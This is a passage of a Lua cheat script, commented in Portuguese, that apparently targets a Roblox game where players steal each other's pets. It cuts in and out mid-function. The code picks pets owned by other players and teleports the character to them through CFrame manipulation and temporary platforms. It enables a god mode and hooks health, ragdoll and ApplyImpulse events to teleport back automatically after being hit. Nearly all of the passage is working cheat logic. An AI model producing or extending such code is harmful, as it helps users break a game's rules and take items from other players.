                local bestFace = FACE_TARGETS_S2[1]
                local minFaceDist = math.huge
                for _, v in ipairs(FACE_TARGETS_S2) do
                    local d = (hrp.Position - v).Magnitude
                    if d < minFaceDist then minFaceDist = d; bestFace = v end
                end
                hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(bestFace.X, hrp.Position.Y, bestFace.Z))
                task.wait(0.01)
                walkForward(0.10)
                task.wait(0.10)
            else
                -- Base fechada: TP para base lateral + clone
                for i = 1, 10 do
                    hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                    if (hrp.Position - targetBasePos).Magnitude > 3 then
                        hrp.CFrame = CFrame.new(targetBasePos, targetBasePos + faceDir)
                        task.wait(0.05)
                    end
                end
                task.wait(0.05)
                do
                    local newPos = hrp.Position + faceDir * 1
                    hrp.CFrame = CFrame.new(newPos, newPos + faceDir)
                end
                task.wait(0.02)
                instantClone()
                while _G.isCloning do task.wait() end
            end
        end
        task.wait(0.04)

        if carpet then hum:EquipTool(carpet) end

        local verticalDiff = targetPart.Position.Y - hrp.Position.Y

        if verticalDiff > 2 then
            local airPos = Vector3.new(targetPart.Position.X, targetPart.Position.Y - 5, targetPart.Position.Z)
            local plat = Instance.new("Part")
            plat.Name = "BullysTempPlatform"; plat.Size = Vector3.new(3, 1, 3)
            plat.Position = airPos - Vector3.new(0, 5, 0)
            plat.Color = Color3.new(1, 0, 0); plat.Material = Enum.Material.Neon
            plat.Anchored = true; plat.CanCollide = true; plat.Transparency = 0.3
            plat.Parent = Workspace
            RunService.Heartbeat:Wait()
            for i = 1, 10 do
                if not LocalPlayer:GetAttribute("Stealing") then
                    hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                    hrp.CFrame = CFrame.new(airPos, airPos + faceDir)
                    task.wait(0.05)
                end
            end
            task.spawn(function()
                local start = tick()
                while tick() - start < 20 do
                    if LocalPlayer:GetAttribute("Stealing") then break end
                    task.wait(0.1)
                end
                if plat and plat.Parent then plat:Destroy() end
            end)
        else
            for i = 1, 10 do
                if LocalPlayer:GetAttribute("Stealing") then break end
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                if (hrp.Position - targetPart.Position).Magnitude > 3 then
                    hrp.CFrame = CFrame.new(targetPart.Position, targetPart.Position + faceDir)
                    task.wait(0.05)
                end
                task.wait(0.05)
            end
        end

        State.isTpMoving = false
    end

    _G._runAutoSnipe2Sides = runAutoSnipe2Sides

    -- ═══════════════════════════════════════════════════════════════════
    -- ▸ AUTO TP · Compara 4 candidatos (2 sides + 2 frontais) e despacha
    -- ═══════════════════════════════════════════════════════════════════
    -- Pega o mais perto entre side_std, side_alt, frontal_frente, frontal_trás.
    -- Se vencedor é um side  → chama runAutoSnipe2Sides (que repica internamente)
    -- Se vencedor é frontal → chama runAutoSnipeFront (que repica internamente)
    -- Como cada função usa a mesma lógica de distância, a repicagem bate.
    local function runAutoSnipeAuto()
        if State.isTpMoving then return end

        -- Mesma seleção de target das outras (priority/cache)
        local targetPetData = nil
        local cache = SharedState.AllAnimalsCache
        if Config.AutoTPPriority then
            if cache and type(cache) == "table" then
                for _, pName in ipairs(PRIORITY_LIST) do
                    local searchName = pName:lower()
                    for _, a in ipairs(cache) do
                        if a and a.name and a.name:lower() == searchName and a.owner ~= LocalPlayer.Name then
                            targetPetData = a; break
                        end
                    end
                    if targetPetData then break end
                end
                if not targetPetData then
                    for _, a in ipairs(cache) do
                        if a and a.owner ~= LocalPlayer.Name then targetPetData = a; break end
                    end
                end
            end
        else
            if SharedState.SelectedPetData then
                targetPetData = SharedState.SelectedPetData.animalData
            end
        end
        if not targetPetData then return end

        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local targetPart = findAdorneeGlobal(targetPetData)
        if not targetPart then return end

        local exactPos = targetPart.Position
        local isSecondFloor = exactPos.Y > 10
        local plotIdx = getClosestBaseIdx_S2(exactPos)

        -- 2 candidatos do 2Sides (std e alt) — usam tabelas do escopo do bloco
        local sideStd = isSecondFloor and BASES_HIGH_S2[plotIdx] or BASES_LOW_S2[plotIdx]
        local sideAlt = isSecondFloor and BASES_HIGH_ALT_S2[plotIdx] or BASES_LOW_ALT_S2[plotIdx]
        local sideStdDist = sideStd and (hrp.Position - sideStd).Magnitude or math.huge
        local sideAltDist = sideAlt and (hrp.Position - sideAlt).Magnitude or math.huge
        local minSide = math.min(sideStdDist, sideAltDist)

        -- 2 candidatos do Front (frente e trás) — calculados dinamicamente via signPart
        local minFront = math.huge
        local getSign = _G._getClosestBaseSign
        if getSign then
            local signPart = getSign(targetPart)
            if signPart then
                local FORWARD = signPart.CFrame.LookVector
                local BACK = -FORWARD
                local mult = isSecondFloor and 15 or 20
                local frontPoint = signPart.Position + (FORWARD * mult)
                local backPoint  = signPart.Position + (BACK * mult)
                local frontDist = (hrp.Position - frontPoint).Magnitude
                local backDist  = (hrp.Position - backPoint).Magnitude
                minFront = math.min(frontDist, backDist)
            end
        end

        -- Despacho: vencedor decide qual função roda
        if minFront < minSide then
            return runAutoSnipeFront()
        else
            return runAutoSnipe2Sides()
        end
    end

    _G._runAutoSnipeAuto = runAutoSnipeAuto
end
local runAutoSnipe2Sides = _G._runAutoSnipe2Sides
local runAutoSnipeAuto = _G._runAutoSnipeAuto

-- ══════════════════════════════════════════════════════════════════════════

-- Mostra o número de cada base (1-8) flutuando em cima por 20s
_G.BullysShowBaseNumbers = function()
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then return end
    local created = {}
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local rootPart = plot:FindFirstChild("MainRootPart") or plot:FindFirstChildWhichIsA("BasePart")
        if rootPart then
            local pos = rootPart.Position
            local col = (pos.X < -400) and 1 or 2
            local row
            if     pos.Z < -40  then row = 1
            elseif pos.Z <  60  then row = 2
            elseif pos.Z < 160  then row = 3
            else                     row = 4
            end
            local baseNum = col == 1 and row or (row + 4)

            local bb = Instance.new("BillboardGui")
            bb.Name         = "BullysBaseNumber_" .. baseNum
            bb.Adornee      = rootPart
            bb.Size         = UDim2.new(0, 130, 0, 130)
            bb.StudsOffset  = Vector3.new(0, 25, 0)
            bb.AlwaysOnTop  = true
            bb.MaxDistance  = 1500
            bb.Parent       = Workspace

            local bg = Instance.new("Frame", bb)
            bg.Size             = UDim2.new(1, 0, 1, 0)
            bg.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
            bg.BackgroundTransparency = 0.15
            bg.BorderSizePixel  = 0
            Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
            local stroke = Instance.new("UIStroke", bg)
            stroke.Color       = Color3.fromRGB(120, 180, 255)
            stroke.Thickness   = 3
            stroke.Transparency = 0.1

            local label = Instance.new("TextLabel", bb)
            label.Size             = UDim2.new(1, 0, 0.7, 0)
            label.Position         = UDim2.new(0, 0, 0, 0)
            label.BackgroundTransparency = 1
            label.Text             = tostring(baseNum)
            label.Font             = Enum.Font.GothamBlack
            label.TextSize         = 72
            label.TextColor3       = Color3.fromRGB(255, 255, 255)
            label.TextStrokeTransparency = 0.2
            label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

            local sub = Instance.new("TextLabel", bb)
            sub.Size               = UDim2.new(1, 0, 0.3, 0)
            sub.Position           = UDim2.new(0, 0, 0.7, 0)
            sub.BackgroundTransparency = 1
            sub.Text               = "BASE " .. baseNum
            sub.Font               = Enum.Font.GothamBold
            sub.TextSize           = 14
            sub.TextColor3         = Color3.fromRGB(120, 180, 255)
            sub.TextStrokeTransparency = 0.2

            table.insert(created, bb)
        end
    end
    task.delay(20, function()
        for _, bb in ipairs(created) do
            if bb and bb.Parent then bb:Destroy() end
        end
    end)
end

-- Detecta a base (1-8) do alvo atual pra checar override per-base
local function getBaseOfCurrentTarget()
    local targetPetData = nil
    if Config.AutoTPPriority then
        local cache = SharedState.AllAnimalsCache
        if cache and type(cache)=="table" then
            for _, pName in ipairs(PRIORITY_LIST or {}) do
                local sn = pName:lower()
                for _, a in ipairs(cache) do
                    if a and a.name and a.name:lower()==sn and a.owner~=LocalPlayer.Name then
                        targetPetData = a; break
                    end
                end
                if targetPetData then break end
            end
            if not targetPetData then
                for _, a in ipairs(cache) do
                    if a and a.owner~=LocalPlayer.Name then targetPetData = a; break end
                end
            end
        end
    end
    if not targetPetData and SharedState.SelectedPetData then
        targetPetData = SharedState.SelectedPetData.animalData
    end
    if not targetPetData then return nil end
    local part = findAdorneeGlobal(targetPetData)
    if not part then return nil end
    local pos = part.Position
    local col = (pos.X < -400) and 1 or 2
    local row
    if     pos.Z < -40  then row = 1
    elseif pos.Z <  60  then row = 2
    elseif pos.Z < 160  then row = 3
    else                     row = 4
    end
    return col == 1 and row or (row + 4)
end

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ AUTO TP LEGACY · Lógica antiga baseada em raycasts (mantida, NÃO usada) ◂
-- ▸ A nova runAutoSnipeAuto fica dentro do bloco do 2Sides (mais abaixo).
-- ══════════════════════════════════════════════════════════════════════════
local function _runAutoSnipeAutoLegacy()
    if State.isTpMoving then return end
    _G.posUnlocked = false

    -- TP Delay
    local tpDelay = tonumber(Config.TpSettings.TpDelay) or 0
    if tpDelay > 0 then task.wait(tpDelay / 1000) end

    -- TP After FPS
    if Config.TpSettings.TpAfterFps then
        local thr = tonumber(Config.TpSettings.FpsThreshold) or 60
        local t0 = tick()
        while getCurrentFps() < thr and tick() - t0 < 5 do task.wait() end
        local fpsWait = tonumber(Config.TpSettings.FpsWait) or 0
        if fpsWait > 0 then task.wait(fpsWait) end
    end

    if State.carpetSpeedEnabled then
        setCarpetSpeed(false)
        if _carpetStatusLabel then _carpetStatusLabel.Text = "OFF"; _carpetStatusLabel.TextColor3 = Theme.Error end
    end

    -- Pegar target
    local targetPetData = nil
    if Config.AutoTPPriority then
        local bestEntry = nil
        local cache = SharedState.AllAnimalsCache
        if cache and type(cache) == "table" then
            for _, pName in ipairs(PRIORITY_LIST) do
                local sn = pName:lower()
                for _, a in ipairs(cache) do
                    if a and a.name and a.name:lower() == sn and a.owner ~= LocalPlayer.Name then bestEntry = a; break end
                end
                if bestEntry then break end
            end
            if not bestEntry then
                for _, a in ipairs(cache) do
                    if a and a.owner ~= LocalPlayer.Name then bestEntry = a; break end
                end
            end
        end
        if bestEntry then targetPetData = bestEntry
        else
            if not SharedState.SelectedPetData then ShowNotification("ERROR", "No target!"); return end
            targetPetData = SharedState.SelectedPetData.animalData
        end
    else
        if not SharedState.SelectedPetData then ShowNotification("ERROR", "No target!"); return end
        targetPetData = SharedState.SelectedPetData.animalData
    end
    if not targetPetData then return end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    if not hrp or not hum or hum.Health <= 0 then return end

    State.isTpMoving = true; isTpMoving = State.isTpMoving
    playFullScreenFlash()
    enableGodMode()

    local function finishTP()
        State.isTpMoving = false; isTpMoving = State.isTpMoving
        task.delay(0.5, disableGodMode)
    end

    local targetPart = findAdorneeGlobal(targetPetData)
    if not targetPart then finishTP(); return end

    local exactPos = targetPart.Position
    local targetPodium, targetPosition = getTargetPodiumAndSafePosition(targetPetData, exactPos)
    local claimPart = findClaimModel(targetPodium)

    -- ── Calcular 3 direções de approach ──
    local dirForward
    if claimPart then
        local df = targetPosition - claimPart.Position
        if df.Magnitude > 0.5 then
            dirForward = Vector3.new(df.X, 0, df.Z).Unit
        else
            dirForward = Vector3.new(0, 0, -1)
        end
    else
        local df = targetPosition - hrp.Position
        if df.Magnitude > 0.5 then
            dirForward = Vector3.new(df.X, 0, df.Z).Unit
        else
            dirForward = Vector3.new(0, 0, -1)
        end
    end

    -- Frente = direção do claim → brainrot
    -- Esquerda = 90° anti-horário
    -- Direita = 90° horário
    local dirLeft = Vector3.new(-dirForward.Z, 0, dirForward.X)
    local dirRight = Vector3.new(dirForward.Z, 0, -dirForward.X)
    local dirBehind = -dirForward

    local APPROACH_DIST = 7
    local approaches = {
        {name = "Front",  dir = dirForward, pos = targetPosition + dirForward * APPROACH_DIST},
        {name = "Left",   dir = dirLeft,    pos = targetPosition + dirLeft * APPROACH_DIST},
        {name = "Right",  dir = dirRight,   pos = targetPosition + dirRight * APPROACH_DIST},
        {name = "Behind", dir = dirBehind,  pos = targetPosition + dirBehind * APPROACH_DIST},
    }

    -- ── Raycast: verificar qual direção tem caminho livre ──
    local rpParams = RaycastParams.new()
    rpParams.FilterDescendantsInstances = {char}
    rpParams.FilterType = Enum.RaycastFilterType.Exclude

    local bestApproach = nil
    local bestScore = -1

    for _, ap in ipairs(approaches) do
        local score = 100

        -- Ray 1: do ponto de approach → target (tem parede no meio?)
        local ray1 = Workspace:Raycast(ap.pos + Vector3.new(0, 3, 0), (targetPosition - ap.pos), rpParams)
        if ray1 then
            -- Tem obstáculo entre approach e target
            local hitDist = (ray1.Position - ap.pos).Magnitude
            local totalDist = (targetPosition - ap.pos).Magnitude
            if hitDist < totalDist * 0.8 then
                score = score - 50 -- Parede bloqueando
            end
        end

        -- Ray 2: de cima pra baixo no ponto de approach (tem chão?)
        local ray2 = Workspace:Raycast(
            Vector3.new(ap.pos.X, targetPosition.Y + 15, ap.pos.Z),
            Vector3.new(0, -30, 0),
            rpParams
        )
        if ray2 then
            score = score + 10 -- Tem chão = bom
        else
            score = score - 30 -- Sem chão = ruim
        end

        -- Ray 3: horizontal do approach position (tem parede atrás?)
        local ray3 = Workspace:Raycast(
            targetPosition + Vector3.new(0, 3, 0),
            ap.dir * (APPROACH_DIST + 3),
            rpParams
        )
        if ray3 then
            local wallDist = (ray3.Position - targetPosition).Magnitude
            if wallDist < APPROACH_DIST then
                score = score - 40 -- Parede muito perto
            end
        end

        if score > bestScore then
            bestScore = score
            bestApproach = ap
        end
    end

    if not bestApproach then bestApproach = approaches[1] end

    -- ── Calcular posição final ──
    local approachPos = bestApproach.pos
    local ray = Workspace:Raycast(
        Vector3.new(approachPos.X, targetPosition.Y + 15, approachPos.Z),
        Vector3.new(0, -1000, 0),
        rpParams
    )
    if not ray then finishTP(); return end

    local finalHeight = ray.Position.Y + 5.5
    local finalPos = Vector3.new(approachPos.X, finalHeight, approachPos.Z)
    local lookTarget = claimPart and Vector3.new(claimPart.Position.X, finalPos.Y, claimPart.Position.Z) or targetPosition
    local finalFacing = CFrame.lookAt(finalPos, lookTarget)
    local facingRot = finalFacing - finalFacing.Position

    -- ── Executar TP ──
    local isSecondFloor = targetPosition.Y > 10

    -- Equipa carpet
    local carpetName = Config.TpSettings.Tool or "Flying Carpet"
    local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
    if carpet and hum and hum.Parent then
        hum:EquipTool(carpet)
        task.wait(0.05)
    end

    if not char.Parent or not hrp.Parent then finishTP(); return end

    if hrp.Position.Y > 25 and targetPosition.Y > 25 then
        -- Já no alto: TP direto
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = CFrame.new(finalPos) * facingRot
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    else
        -- Impulso vertical pra subir (como no vídeo)
        local targetH = math.max(finalPos.Y, 50)
        local jumpStart = tick()
        while hrp.Position.Y < targetH and (tick() - jumpStart) < 2 do
            hrp.AssemblyLinearVelocity = Vector3.new(0, 280, 0)
            RunService.Heartbeat:Wait()
        end

        -- CFrame pra posição final (8 tentativas)
        for _ = 1, 8 do
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            if (hrp.Position - finalPos).Magnitude > 3 then
                hrp.CFrame = CFrame.new(finalPos) * facingRot
                task.wait(0.03)
            end
        end

        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end

    -- Esperar estabilizar
    task.wait(0.1)

    -- Re-verificar se target ainda tá lá
    local finalTarget = findAdorneeGlobal(targetPetData)
    if finalTarget then
        hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(finalTarget.Position.X, hrp.Position.Y, finalTarget.Position.Z))
    end

    task.wait(0.05)
    finishTP()
end

-- Dispatcher: Auto / Side / 2Sides / Front — com override opcional por base
local function runAutoSnipe()
    local mode = Config.TpSettings.TpMode or "Side"

    -- Checa se tem override pro base atual
    local baseNum = getBaseOfCurrentTarget()
    if baseNum and Config.TpSettings.PerBaseTpMode then
        local override = Config.TpSettings.PerBaseTpMode[tostring(baseNum)]
        if override and override ~= "Default" then
            mode = override
        end
    end

    if mode == "Front" then
        return runAutoSnipeFront()
    elseif mode == "2Sides" then
        return runAutoSnipe2Sides()
    elseif mode == "Auto" then
        return runAutoSnipeAuto()
    else
        return runAutoSnipeSide()
    end
end

-- ═══════════════════════════════════════════════════════════════════
-- AUTO BACK SYSTEM (lógica EXATA importada do hub Logística)
-- Dispara em: Stealing complete, HealthChanged, Ragdoll/Physics, ApplyImpulse
-- Funciona em todos os modos de TP (Side / 2Sides / Front / Auto)
-- ═══════════════════════════════════════════════════════════════════

local function isInsideAnyBase()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end

    local pos = hrp.Position
    local closestIdx = getClosestBaseIdx(pos)
    local basePos = BASES_LOW[closestIdx]
    local dist = (Vector2.new(pos.X, pos.Z) - Vector2.new(basePos.X, basePos.Z)).Magnitude

    return dist < 160
end

local function getReturnTargetAnimalData()
    if State.manualTargetEnabled and SharedState.SelectedPetData and SharedState.SelectedPetData.animalData then
        return SharedState.SelectedPetData.animalData
    end
    local cache = SharedState.AllAnimalsCache
    if cache and type(cache) == "table" then
        if State.lastStealTargetUID then
            for _, a in ipairs(cache) do
                if a and a.uid == State.lastStealTargetUID then return a end
            end
        end
        for _, pName in ipairs(PRIORITY_LIST) do
            local sn = pName:lower()
            for _, a in ipairs(cache) do
                if a and a.name and a.name:lower() == sn and a.owner ~= LocalPlayer.Name then return a end
            end
        end
        for _, a in ipairs(cache) do
            if a and a.owner ~= LocalPlayer.Name then return a end
        end
    end
    return SharedState.SelectedPetData and SharedState.SelectedPetData.animalData or nil
end

local function runHitAutoBack()
    if not Config.AutoBack then return end
    if State.isTpMoving then return end
    if _G._autoPickupLocked then return end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    task.spawn(function()
        -- Sem espera: retorno quase instantâneo ao ser atingido
        local targetAnimalData = getReturnTargetAnimalData()
        if not targetAnimalData then
            if _G.tpToBestBrainrot then _G.tpToBestBrainrot() end
            return
        end

        local targetPart = findAdorneeGlobal(targetAnimalData)
        if not targetPart or not targetPart.Parent then return end

        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            local toolName = Config.TpSettings and Config.TpSettings.Tool
            if type(toolName) == "string" and toolName ~= "" then
                local tool = LocalPlayer.Backpack:FindFirstChild(toolName) or char:FindFirstChild(toolName)
                if tool then pcall(function() hum:EquipTool(tool) end) end
            end
        end
        -- Aguarda apenas 1 frame para o equip registrar
        RunService.Heartbeat:Wait()

        -- Se já está dentro de uma base, vai direto ao brainrot sem TP completo
        local alreadyInBase = isInsideAnyBase()

        -- Se a distância horizontal for muito grande E não estiver numa base, usa o TP completo
        local horizontalDist = (Vector2.new(hrp.Position.X, hrp.Position.Z) - Vector2.new(targetPart.Position.X, targetPart.Position.Z)).Magnitude
        if horizontalDist > 40 and not alreadyInBase then
            if _G.tpToBestBrainrot then
                _G.tpToBestBrainrot()
            else
                runAutoSnipe()
            end
            return
        end

        local verticalDiff = targetPart.Position.Y - hrp.Position.Y

        -- Lógica para 3º andar (ou qualquer andar acima)
        if verticalDiff > 2 then
            local airPos = Vector3.new(targetPart.Position.X, targetPart.Position.Y - 6.6, targetPart.Position.Z)

            local plat = Instance.new("Part")
            plat.Name = "XiTempPlatform_Return"
            plat.Size = Vector3.new(3, 1, 3)
            plat.Position = airPos - Vector3.new(0, 5, 0)
            plat.Color = Color3.new(1, 0, 0)
            plat.Material = Enum.Material.Neon
            plat.Anchored = true
            plat.CanCollide = true
            plat.Transparency = 0.3
            plat.Parent = Workspace

            RunService.Heartbeat:Wait()

            for i = 1, 10 do
                if LocalPlayer:GetAttribute("Stealing") then break end
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
                hrp.CFrame = CFrame.new(airPos)
                task.wait(0.02) -- loop mínimo
            end

            task.spawn(function()
                local start = tick()
                while tick() - start < 20 do
                    if LocalPlayer:GetAttribute("Stealing") then break end
                    task.wait(0.1)
                end
                if plat and plat.Parent then plat:Destroy() end
            end)
        else
            -- TP direto ao brainrot (1º e 2º andar)
            hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
            hrp.CFrame = CFrame.new(targetPart.Position)
        end
    end)
end

-- Trigger 1: Stealing changed (steal complete) → Auto Back quase instantâneo
task.spawn(function()
    local function updateStealingState()
        local s = (LocalPlayer:GetAttribute("Stealing") == true)
        local wasStealing = State.isStealing
        State.isStealing = s

        if s then
            State.lastStealingTrueTime = tick()
        elseif wasStealing and not s then
            task.spawn(function()
                task.wait(0.02)
                if not State.stealJustCompleted and Config.AutoBack and isInsideAnyBase() then
                    pcall(runHitAutoBack)
                end
            end)
        end
    end
    pcall(updateStealingState)
    pcall(function()
        LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(updateStealingState)
    end)
    RunService.Heartbeat:Connect(updateStealingState)
end)

-- Trigger 2: HealthChanged + Physics/Ragdoll/Rocket + ApplyImpulse
task.spawn(function()
    local lastHealth = nil
    local lastTrigger = 0
    local ignoreUntil = 0
    local conn = nil
    local applyImpConn = nil

    local function hookCharacter(c)
        if conn then pcall(function() conn:Disconnect() end) end
        conn = nil
        lastHealth = nil

        local hum = c and c:FindFirstChildOfClass("Humanoid")
        local hrp = c and c:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end
        lastHealth = hum.Health

        conn = hum.HealthChanged:Connect(function(newHealth)
            if not Config.AutoBack then lastHealth = newHealth; return end
            if State.stealJustCompleted then lastHealth = newHealth; return end
            if _G._autoPickupLocked then lastHealth = newHealth; return end
            if newHealth < (lastHealth or newHealth) then
                if (tick() - lastTrigger) > 0.25 then
                    lastTrigger = tick()
                    ignoreUntil = tick() + 0.4
                    pcall(runHitAutoBack)
                end
            end
            lastHealth = newHealth
        end)

        -- Monitor de estado e velocidade (Ragdoll/Rocket)
        task.spawn(function()
            while c and c.Parent and hum and hum.Parent do
                if Config.AutoBack and not State.isTpMoving and not _G._autoPickupLocked then
                    local velocity = hrp.AssemblyLinearVelocity
                    local state = hum:GetState()

                    -- Detecção de Rocket (velocidade vertical alta) ou Ragdoll (Physics ou Sit inesperado)
                    if (velocity.Y > 150) or (state == Enum.HumanoidStateType.Physics) or (hum.Sit and not State.isStealing) then
                        if not State.stealJustCompleted and (tick() - lastTrigger) > 1.5 then
                            lastTrigger = tick()
                            pcall(runHitAutoBack)
                        end
                    end
                end
                task.wait(0.3)
            end
        end)
    end

    pcall(function()
        local pkg = ReplicatedStorage:FindFirstChild("Packages")
        if pkg then
            local net = pkg:FindFirstChild("Net")
            if net then
                local applyImp = net:FindFirstChild("RE/CombatService/ApplyImpulse")
                if applyImp and applyImp:IsA("RemoteEvent") then
                    applyImpConn = applyImp.OnClientEvent:Connect(function()
                        if tick() < ignoreUntil then return end
                        if not Config.AutoBack then return end
                        if State.isTpMoving then return end
                        if State.stealJustCompleted then return end
                        if _G._autoPickupLocked then return end
                        if (tick() - lastTrigger) <= 0.25 then return end
                        lastTrigger = tick()
                        ignoreUntil = tick() + 0.4
                        pcall(runHitAutoBack)
                    end)
                end
            end
        end
    end)

    if LocalPlayer.Character then
        hookCharacter(LocalPlayer.Character)
    end
    LocalPlayer.CharacterAdded:Connect(function(c)
        task.wait(0.1)
        hookCharacter(c)
    end)
end)

-- Detecta roubo completo (bloqueia Auto Back após steal)
task.spawn(function()
    local function checkStealComplete(gui)
        local txt = (gui:IsA("TextLabel") or gui:IsA("TextButton")) and gui.Text
        if txt and string.find(txt, "You stole") then
            State.stealJustCompleted = true
            task.delay(2, function() State.stealJustCompleted = false end)
        end
    end
    PlayerGui.DescendantAdded:Connect(function(gui)
        checkStealComplete(gui)
        if gui:IsA("TextLabel") or gui:IsA("TextButton") then
            gui:GetPropertyChangedSignal("Text"):Connect(function() checkStealComplete(gui) end)
        end
    end)
end)

-- ═══════════════════════════════════════════════════════════════════
_G.runAutoSnipe = runAutoSnipe
;(function()
    local function isInsideStealHitbox()
        local char = LocalPlayer.Character
        if not char then return false end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return false end

        local petData = SharedState.SelectedPetData
        if not petData then return false end
        local animalData = petData.animalData or petData
        if not animalData or not animalData.plot then return false end

        local Plots = Workspace:FindFirstChild("Plots")
        if not Plots then return false end
        local plot = Plots:FindFirstChild(animalData.plot)
        if not plot then return false end

        local stealHitbox = plot:FindFirstChild("StealHitbox")
        if not stealHitbox then return false end

        local playerPos = hrp.Position

        local function checkPart(part)
            local cf = part.CFrame
            local sz = part.Size
            local lp = cf:PointToObjectSpace(playerPos)
            return math.abs(lp.X) <= sz.X/2
               and math.abs(lp.Y) <= sz.Y/2
               and math.abs(lp.Z) <= sz.Z/2
        end

        if stealHitbox:IsA("BasePart") then
            return checkPart(stealHitbox)
        elseif stealHitbox:IsA("Model") then
            for _, part in ipairs(stealHitbox:GetDescendants()) do
                if part:IsA("BasePart") and part.Transparency < 1 then
                    if checkPart(part) then return true end
                end
            end
        end
        return false
    end

    local _autoBackThread = nil
    local _autoBackStealConn = nil
    local _teleportingBelow = false
    local _forceAutoBackInstantCount = 0

    local function stopAutoBack()
        if _autoBackThread then task.cancel(_autoBackThread); _autoBackThread = nil end
        if _autoBackStealConn then _autoBackStealConn:Disconnect(); _autoBackStealConn = nil end
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local bp = hrp:FindFirstChild("TP_BodyPosition")
            if bp then bp:Destroy() end
        end
        _teleportingBelow = false
    end

    local function getAutoBackTarget()
        local petData = SharedState.SelectedPetData
        if not petData then return nil end
        local animalData = petData.animalData or petData
        local part = findAdorneeGlobal(animalData)
        if not part then return nil end
        return part.Position, animalData
    end

    local function teleportBelowPet()
        if _G.posUnlocked then return end
        if _teleportingBelow then return end
        _teleportingBelow = true
        pcall(function()
            local targetPos, animalData = getAutoBackTarget()
            if not targetPos then return end

            local char = LocalPlayer.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hrp or not hum then return end

            local petX, petY, petZ = targetPos.X, targetPos.Y, targetPos.Z
            local playerY = hrp.Position.Y

            if playerY > 25 and petY > 25 then
                hrp.CFrame = CFrame.new(targetPos)
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                _teleportingBelow = false
                return
            end

            if playerY >= 8.8 and petY < 8.8 then return end
            if playerY <= 8.8 and petY > 24 then return end

            local carpetName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
            local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
            if carpet and hum then hum:EquipTool(carpet); task.wait(0.1) end

            local targetY
            if petY > 22 or (playerY < 8.8 and petY >= 8.8) then
                targetY = petY - 7.5
            else
                local rp = RaycastParams.new()
                rp.FilterDescendantsInstances = {char}
                rp.FilterType = Enum.RaycastFilterType.Exclude
                local res = Workspace:Raycast(Vector3.new(petX, petY, petZ), Vector3.new(0, -200, 0), rp)
                targetY = res and (res.Position.Y + 1.4) or 0.5
            end

            local tPos = Vector3.new(petX, targetY, petZ)
            local dist = (Vector3.new(hrp.Position.X, targetY, hrp.Position.Z) - tPos).Magnitude

            if dist > 1.5 or math.abs(hrp.Position.Y - targetY) > 2 then
                hrp.CFrame = CFrame.new(petX, targetY, petZ)
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end

            local bp = hrp:FindFirstChild("TP_BodyPosition")
            if not bp then
                bp = Instance.new("BodyPosition")
                bp.Name = "TP_BodyPosition"
                bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bp.P = 10000
                bp.D = 500
                bp.Parent = hrp
            end
            bp.Position = tPos
            bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        end)
        _teleportingBelow = false
    end

    local function startAutoBack()
        stopAutoBack()

        _autoBackStealConn = LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
            if LocalPlayer:GetAttribute("Stealing") == true then
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local bp = hrp:FindFirstChild("TP_BodyPosition")
                    if bp then bp:Destroy() end
        task.spawn(function()
                task.wait(0.1)
                        local rp = RaycastParams.new()
                        rp.FilterDescendantsInstances = {char}
                        rp.FilterType = Enum.RaycastFilterType.Exclude
                        local res = Workspace:Raycast(
                            Vector3.new(hrp.Position.X, hrp.Position.Y, hrp.Position.Z),
                            Vector3.new(0, -200, 0), rp
                        )
                        local floorY = res and (res.Position.Y + 1.4) or 0.5
                        hrp.CFrame = CFrame.new(hrp.Position.X, floorY, hrp.Position.Z)
